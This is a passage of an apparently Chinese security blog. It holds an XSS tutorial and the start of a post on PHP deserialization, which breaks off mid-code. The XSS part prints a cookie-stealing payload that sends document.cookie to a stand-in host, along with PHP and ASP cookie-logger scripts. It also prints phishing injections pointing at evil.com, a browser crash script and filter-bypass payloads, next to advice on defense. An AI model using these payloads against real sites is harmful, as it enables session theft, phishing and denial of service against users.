title="简介"></a>简介</h4><p>Cookie是用户浏览网页时网站存储在用户机器上的小文本文件，里面记录了和用户相关的一些状态或设置，如：用户名、ID、访问次数等，当用户下次访问此网站时，网站会先访问用户机器上对应的该网站的Cookie文件，例如：登陆页面的记住密码功能，在Cookie有效期内可直接鼎炉</p><p>根据Cookie时效性可分为两种类型：<br>持久型：以文本形式存储在硬盘上，由浏览器存取<br>临时型：亦称作会话Cookie，存储在内存中，当浏览器关闭后即消失</p><hr><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>Cookie时Web应用程序用来识别用户的凭证，且很多情况下时唯一的凭证。当用户第一次登陆网站时，网站会给用户发放一个唯一的Cookie，当用户再次登录网站时，凭借该Cookie，用户就无需再次进行登录操作<br>通过JS，浏览器可以操作用户的Cookie<br>浏览器地址栏输入：<br><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 查看某个网站颁发的Cookie</span><br>javascript:alert(document.cookie)<br></code></pre></td></tr></table></figure></p><hr><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XSS又叫CSS(Cross Site Script)跨站脚本攻击。它指的时攻击者往Web页面或URL里插入恶意JS代码，若Web应用程序对于用户输入没有过滤，那么当正常用户浏览该页面时，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的</p><p>服务端<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $input = $_GET[<span class="hljs-string">"param"</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div&gt;"</span>.$input.<span class="hljs-string">"&lt;/div&gt;"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>用户提交<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(/xss/)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><ul><li>可以控制输入点</li><li>输入能返回到前端页面上被浏览器当成脚本语言解释执行</li></ul><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>Cookie窃取</li><li>会话劫持</li><li>键盘记录</li><li>客户端信息探查</li><li>网页挂马</li><li>XSS蠕虫</li></ul><hr><h3 id="XSS类别"><a href="#XSS类别" class="headerlink" title="XSS类别"></a>XSS类别</h3><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>DOM(Document Object Model)，是一个平台和语言都中立的接口，可以使程序和脚本能动态访问和更新文档的内容、结构以及样式<br>DOM-XSS简单理解为：输出点在DOM</p><p><a href="https://blog.csdn.net/ski_12/article/details/60468362" target="_blank" rel="noopener">相关资料</a></p><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型XSS又称为持久型XSS。攻击者上传的包含恶意JS脚本的留言等信息被Web应用程序保存到数据库中，Web应用程序在新生成页面时，如果包含了该恶意JS脚本，将会导致所有访问到该网页的浏览器执行该恶意JS脚本。这种攻击类型一般常见在博客、论坛等网站中</p><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h3><ul><li>获取管理员权限（获取Cookie）</li><li>写配置文件Getshell</li><li>键盘记录</li><li>获取内网IP<br>…</li></ul><hr><h3 id="Cookie获取"><a href="#Cookie获取" class="headerlink" title="Cookie获取"></a>Cookie获取</h3><p>eg:<br>在远程服务器上，有一个接收和记录Cookies信息的文件<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<br>document.location=<span class="hljs-string">"http://www.test.com/cookie.asp?cookie="</span>+document.cookie<br>&lt;/script&gt;<br><br>&lt;img src=<span class="hljs-string">"http://www.test.com/cookie.asp?cookie="</span>+document.cookie&gt;&lt;/img&gt;<br></code></pre></td></tr></table></figure></p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br>  msg=Request.ServerVariables(<span class="hljs-string">"QUERY_STRING"</span>)<br>  testfile=Server.MapPath(<span class="hljs-string">"cookie.txt"</span>)<br>  set<br>fs=server.CreateObject(<span class="hljs-string">"Scripting.filesystemobject"</span>)<br>  set thisfile=fs.OpenTextFile(testfile,<span class="hljs-number">8</span>,<span class="hljs-keyword">True</span>,<span class="hljs-number">0</span>)<br>  thisfile.Writeline(<span class="hljs-string">""</span>&amp;msg&amp; <span class="hljs-string">""</span>)<br>  thisfile.close<br>  set fs=nothing<br>%&gt;<br></code></pre></td></tr></table></figure><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $cookie = $_GET[<span class="hljs-string">'cookie'</span>];<br>    $log = fopen(<span class="hljs-string">"cookie.txt"</span>,<span class="hljs-string">"a"</span>);<br>    fwrite($log,$cookie,<span class="hljs-string">"\n"</span>);<br>    fclose($log);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>由于Cookie存在一定的安全缺陷，开发者开始使用更为安全的Session认证方式<br>从网站访问者进入到离开的这段时间中，每个访问者都会得到一个单独的Session，Session时基于防伪的进程，记录了一个访问从开始到结束。当浏览器或进程关闭后，Session也消失了</p><p>Seesion与Cookie的最大区别：</p><ul><li>Session是保存在服务端的内存里</li><li>Cookie保存在浏览器或客户端的文件里</li></ul><hr><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><h4 id="重定向钓鱼"><a href="#重定向钓鱼" class="headerlink" title="重定向钓鱼"></a>重定向钓鱼</h4><p>把当前页面重定向到一个钓鱼页面<br>eg<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.bug.com/index.php?search=<span class="hljs-string">"'&gt;&lt;script&gt;document.location.href="</span>http://www.evil.com<span class="hljs-string">"&lt;/script&gt;</span><br></code></pre></td></tr></table></figure></p><h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>使用XSS漏洞注入HTML或JavaScript代码到页面中<br>eg，该段代码会在正常页面中嵌入一个Form表单<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.bug.com/index.php?search="'<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align:center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"Post"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"phishing.php"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"form"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Login:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"login"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Valid"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"OK"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></p><h4 id="iframe钓鱼"><a href="#iframe钓鱼" class="headerlink" title="iframe钓鱼"></a>iframe钓鱼</h4><p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼<br>eg<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.bug.com/index.php?search='&gt;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://www.evil.com"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100%"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure></p><ul><li><p>Flash钓鱼<br>将构造好的Flash文件传入服务器，在目标网站用<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code>标签引用即可</p></li><li><p>高级钓鱼技术<br>注入代码劫持HTML表单、使用JavaScript编写键盘记录器等</p></li></ul><hr><h4 id="XSS漏洞深入利用"><a href="#XSS漏洞深入利用" class="headerlink" title="XSS漏洞深入利用"></a>XSS漏洞深入利用</h4><ul><li><p>XSS蠕虫<br>通过精心构造的XSS代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能</p></li><li><p>网页挂马<br>一般都是通过篡改网页的方式来实现<br>如：在XSS中使用<code>&lt;iframe&gt;</code>标签</p></li><li><p>DDOS攻击<br>注入恶意JavaScript代码，可能会引起一些拒绝服务攻击</p></li></ul><h4 id="宕机攻击"><a href="#宕机攻击" class="headerlink" title="宕机攻击"></a>宕机攻击</h4><figure class="hljs highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;html&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-comment">// Windows 7 x64</span><br><span class="hljs-comment">// FireFox v53.0.3 (32-bit) Crashes</span><br><span class="hljs-comment">// Credits: John Page / hyp3rlinx</span><br><span class="hljs-comment">// ISR: ApparitionSec</span><br><span class="hljs-comment">// hyp3rlinx.altervista.org</span><br><br><span class="hljs-keyword">var</span> p1=<span class="hljs-string">"\x41"</span>;<span class="hljs-comment">// \x表示16进制，此处表示A</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> c=<span class="hljs-number">0</span>;c&lt;<span class="hljs-number">0xC350</span>;c++) &#123; <br>p1+=<span class="hljs-string">"\x41"</span>;<br>&#125;<br><span class="hljs-keyword">var</span> p2=<span class="hljs-string">"\x41"</span>;<br><span class="hljs-keyword">for</span>(c=<span class="hljs-number">0</span>;c&lt;<span class="hljs-number">0x1388</span>;c++) &#123;<br>p2+=p1;<br>&#125;<br><span class="hljs-keyword">var</span> el = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'FROM'</span>) <span class="hljs-comment">//IMG,FROM,DIV,P,A,H2,IFRAME,TABLE,TEXTAREA</span><br>el.style.color=p2;<br><span class="hljs-built_in">document</span>.body.appendChild(el);<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h2 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h2><h3 id="XSS利用工具"><a href="#XSS利用工具" class="headerlink" title="XSS利用工具"></a>XSS利用工具</h3><p>经过测试，若发现了XSS漏洞，则可以结合一些XSS工具来进行利用，常见的有：</p><ul><li>BlueLotus_XSSReceier</li><li>XSSer.me</li><li>BeEF(Kali自带)</li></ul><hr><h2 id="XSS变形与绕过"><a href="#XSS变形与绕过" class="headerlink" title="XSS变形与绕过"></a>XSS变形与绕过</h2><h3 id="大小写混合字符"><a href="#大小写混合字符" class="headerlink" title="大小写混合字符"></a>大小写混合字符</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">scRiPt</span>&gt;</span><span class="undefined">alert(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">scRiPt</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="过滤尝试"><a href="#过滤尝试" class="headerlink" title="过滤尝试"></a>过滤尝试</h3><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;scr&lt;script&gt;ipt&gt;<br></code></pre></td></tr></table></figure><h3 id="使用其它标签"><a href="#使用其它标签" class="headerlink" title="使用其它标签"></a>使用其它标签</h3><p><strong>src属性</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>/<span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(2)"</span>&gt;</span><br></code></pre></td></tr></table></figure></p><p><strong>iframe</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(2)"</span>&gt;</span><br></code></pre></td></tr></table></figure></p><h3 id="利用属性绕过"><a href="#利用属性绕过" class="headerlink" title="利用属性绕过"></a>利用属性绕过</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- <span class="hljs-string">"background"</span>属性 --&gt;<br>&lt;!--Works on Opera10<span class="hljs-number">.5</span> <span class="hljs-keyword">and</span> IE6--&gt;<br>&lt;table background=javascript:alert(<span class="hljs-number">1</span>)&gt;&lt;/table&gt;  <br><br>&lt;!-- <span class="hljs-string">"posters"</span>属性 --&gt;<br>&lt;!--Works upto Opera10<span class="hljs-number">.5</span> --&gt;<br>&lt;video poster=javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//&gt;&lt;/video&gt;</span><br><br>&lt;!-- <span class="hljs-string">"data"</span>属性--&gt;<br>&lt;object data=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;<br>&lt;object/data=<span class="hljs-comment">//goo.gl/nlX0P?</span><br><br>&lt;!-- <span class="hljs-string">"code"</span>属性 --&gt;<br>&lt;!-- Firefox Only --&gt;<br>&lt;applet code=<span class="hljs-string">"javascript;confirm(document.cookie);"</span>&gt;<br>&lt;embed code=<span class="hljs-string">"http://businessinfo.co.uk/labs/xss/xss.swf"</span> allowscriptaccess=always&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="利用事件绕过"><a href="#利用事件绕过" class="headerlink" title="利用事件绕过"></a>利用事件绕过</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">prompt(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">confirm(2)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">prompt(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="圆括号被过滤"><a href="#圆括号被过滤" class="headerlink" title="圆括号被过滤"></a>圆括号被过滤</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">javascript:windows.onerror</span>=<span class="hljs-string">alert;throw</span> <span class="hljs-attr">1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"javascript:windows.onerror=alert;throw 1"</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h3><p>常用：</p><ul><li>URL编码</li><li>unicode编码</li><li>HTML编码</li><li>CSS编码</li></ul><hr><h2 id="防御与修复"><a href="#防御与修复" class="headerlink" title="防御与修复"></a>防御与修复</h2><p>使用<code>htmlspecialchars()</code>将一些预定义字符转换成HTML实体<br>预定义的字符是：<br><code>&amp;</code> =&gt; <code>&amp;amp;</code><br><code>&quot;</code> =&gt; <code>&amp;quot;</code><br><code>&#39;</code> =&gt; <code>&amp;#39</code><br><code>&lt;</code> =&gt; <code>&amp;lt;</code><br><code>&gt;</code> =&gt; <code>&amp;gt;</code></p><p>HTTP-only<br>当Cookie设置为HTTP-only之后，浏览器的Cookie无法通过客户端js脚本获取<br>eg<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: PHPSESSID=p31aa0tcd4h5qmgjsff87ie680; path=/; HttpOnly<br></code></pre></td></tr></table></figure></p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="XSS小结"><a href="#XSS小结" class="headerlink" title="XSS小结"></a>XSS小结</h3><p>JavaScript能做的，XSS都能做，并且还能做一些HTML和CSS的内容</p><p>不使用script标签的XSS<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><br></code></pre></td></tr></table></figure></p><p><a href="http://test.xss.tv/" target="_blank" rel="noopener">XSS靶场</a></p><hr><h3 id="用短信完成XSS"><a href="#用短信完成XSS" class="headerlink" title="用短信完成XSS"></a>用短信完成XSS</h3><p>Verizon Messages(Message+)<br>是Verizon推出的一款开放跨平台信息交换应用程序，它允许用户在更多的无线设备中交换和共享信息。目前，该软件客户端支持跨平台使用，包括移动设备、桌面设备和Web段，并提升了VZW文字短信的用户体验度</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP反序列化漏洞</title>
      <link href="/2019/01/18/Deserialization-vulnerability/"/>
      <url>/2019/01/18/Deserialization-vulnerability/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>PHP反序列化漏洞也成为PHP对象注入，是一个非常常见的漏洞。此类漏洞虽然有些难以利用，但一旦利用成功就会造成非常严重的后果。漏洞形成的根本原因是程序未对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。<br>反序列化并非PHP特有，它亦存在于Java、Python等语言中，其原理基本相通</p><hr><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chybeta</span></span>&#123;<br>    <span class="hljs-keyword">var</span> $test = <span class="hljs-string">'123'</span>;<br>    &#125;<br>    $class1 = <span class="hljs-keyword">new</span> chybeta;<br>    $class1_ser = serialize($class1);<br>    print_r($class1_ser);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># Result</span><br><span class="hljs-comment"># 对象:名称长度:名称:内容个数:&#123;类型:长度:内容;类型:长度:内容;...&#125;</span><br>O:<span class="hljs-number">7</span>:<span class="hljs-string">"chybeta"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;&#125;<br></code></pre></td></tr></table></figure></p><p>这里<code>O</code>代表存储的是对象（Object），若给<code>serialize()</code>传入的是一个数组，则会变成字母<code>a</code><br><code>7</code>表示对象的名称长度为7个字符<br><code>1</code>表示有一个值<br><code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示该字符串长度，<code>&quot;test&quot;</code>为字符串名称，之后类似</p><hr><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><p>与serialize()对应的，unserialize()可以从已存储的表示中创建php的值，单就本次所关系的环境而言，可以从序列化后的结果中恢复对象（object）<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chybeta</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> $test = <span class="hljs-string">'123'</span>;<br>    &#125;<br><br>    $class2 = <span class="hljs-string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;<br>    print_r($class2);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><br>    $class2_unser = unserialize($class2);<br>    print_r($class2_unser);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>当使用<code>unserialize()</code>恢复对象时，将调用<code>__wakeup()</code>成员函数</p><hr><h3 id="利用构造函数等"><a href="#利用构造函数等" class="headerlink" title="利用构造函数等"></a>利用构造函数等</h3><p>Magic Function<br>php中有一类特殊的方法叫<code>Magic Function</code>，着重关注以下几条：</p><ul><li><p>构造函数<code>__construct()</code><br>当对象创建（new）时会自动调用，但在<code>unserialize()</code>时则不会自动调用</p></li><li><p>析构函数<code>__destruct()</code><br>当对象被销毁时会自动调用</p></li><li><p><code>__wakeup()</code><br><code>unserialize()</code>时会自动调用</p></li></ul><hr><h3 id="基类继承"><a href="#基类继承" class="headerlink" title="基类继承"></a>基类继承</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chybeta</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> $test = <span class="hljs-string">'123'</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"__construct"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"__destruct"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;<br>    &#125;<br>    &#125;<br><br>    $class2 = <span class="hljs-string">'0:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;<br>    